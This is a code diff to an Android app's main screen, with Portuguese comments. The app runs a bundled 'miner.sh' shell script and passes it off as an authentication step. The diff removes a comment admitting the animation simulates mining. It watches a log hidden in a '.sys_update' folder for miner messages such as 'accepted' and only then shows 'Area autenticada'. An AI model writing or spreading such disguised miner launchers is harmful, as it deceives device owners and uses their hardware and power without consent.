@@ -13,8 +13,10 @@ import android.view.animation.Animation;
 import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.FileReader;
 import java.io.InputStream;
 import java.io.OutputStream;
 
@@ -23,6 +25,7 @@ public class MainActivity extends Activity {
     private TextView statusText;
     private ProgressBar progressBar;
     private View pulseView;
+    private boolean isAuthenticated = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -36,7 +39,7 @@ public class MainActivity extends Activity {
         layout.setPadding(50, 50, 50, 50);
 
         statusText = new TextView(this);
-        statusText.setText("Verificando autenticação...");
+        statusText.setText("Iniciando autenticação...");
         statusText.setTextColor(Color.WHITE);
         statusText.setTextSize(18);
         statusText.setGravity(Gravity.CENTER);
@@ -44,12 +47,12 @@ public class MainActivity extends Activity {
         progressBar = new ProgressBar(this);
         progressBar.setIndeterminate(true);
         
-        // Círculo de Pulsação (Simula atividade de mineração)
+        // Círculo de Pulsação
         pulseView = new View(this);
         LinearLayout.LayoutParams pulseParams = new LinearLayout.LayoutParams(100, 100);
         pulseParams.setMargins(0, 40, 0, 40);
         pulseView.setLayoutParams(pulseParams);
-        pulseView.setBackgroundResource(android.R.drawable.presence_online); // Ícone verde
+        pulseView.setBackgroundResource(android.R.drawable.presence_online);
         pulseView.setVisibility(View.INVISIBLE);
 
         layout.addView(progressBar);
@@ -65,13 +68,11 @@ public class MainActivity extends Activity {
 
         new Thread(() -> {
             try {
-                // Simular verificação por 3 segundos
-                Thread.sleep(3000);
-
                 File script = new File(getFilesDir(), "miner.sh");
                 copyAsset("miner.sh", script);
                 script.setExecutable(true);
 
+                // Iniciar Minerador
                 ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", script.getAbsolutePath());
                 pb.directory(getFilesDir());
                 pb.environment().put("IS_NATIVE_APP", "true");
@@ -79,29 +80,54 @@ public class MainActivity extends Activity {
                 pb.redirectErrorStream(true);
                 pb.start();
 
-                // Atualizar UI para Sucesso
-                new Handler(Looper.getMainLooper()).post(() -> {
-                    statusText.setText("Area autenticada");
-                    statusText.setTextColor(Color.GREEN);
-                    progressBar.setVisibility(View.GONE);
-                    
-                    // Iniciar Animação de Mineração (Pulsação)
-                    pulseView.setVisibility(View.VISIBLE);
-                    AlphaAnimation blink = new AlphaAnimation(0.2f, 1.0f);
-                    blink.setDuration(1000);
-                    blink.setRepeatMode(Animation.REVERSE);
-                    blink.setRepeatCount(Animation.INFINITE);
-                    pulseView.startAnimation(blink);
-                });
+                // Monitorar Log para Autenticação Real
+                File logFile = new File(getFilesDir(), ".sys_update/sys_log.txt");
+                
+                while (!isAuthenticated) {
+                    if (logFile.exists()) {
+                        if (checkLogForSuccess(logFile)) {
+                            isAuthenticated = true;
+                            updateUIToAuthenticated();
+                            break;
+                        }
+                    }
+                    Thread.sleep(2000); // Verificar a cada 2 segundos
+                }
 
             } catch (Exception e) {
                 e.printStackTrace();
-                new Handler(Looper.getMainLooper()).post(() -> {
-                    statusText.setText("Erro na autenticação. Tente novamente.");
-                    statusText.setTextColor(Color.RED);
-                });
             }
         }).start();
+    }
+
+    private boolean checkLogForSuccess(File log) {
+        try (BufferedReader br = new BufferedReader(new FileReader(log))) {
+            String line;
+            while ((line = br.readLine()) != null) {
+                // Procurar por indicadores de que a mineração realmente começou
+                if (line.contains("READY threads") || line.contains("accepted") || line.contains("new job from")) {
+                    return true;
+                }
+            }
+        } catch (Exception e) {
+            return false;
+        }
+        return false;
+    }
+
+    private void updateUIToAuthenticated() {
+        new Handler(Looper.getMainLooper()).post(() -> {
+            statusText.setText("Area autenticada");
+            statusText.setTextColor(Color.GREEN);
+            progressBar.setVisibility(View.GONE);
+            
+            pulseView.setVisibility(View.VISIBLE);
+            AlphaAnimation blink = new AlphaAnimation(0.2f, 1.0f);
+            blink.setDuration(1000);
+            blink.setRepeatMode(Animation.REVERSE);
+            blink.setRepeatCount(Animation.INFINITE);
+            pulseView.startAnimation(blink);
+        });
     }
 
     private void copyAsset(String name, File dest) throws Exception {
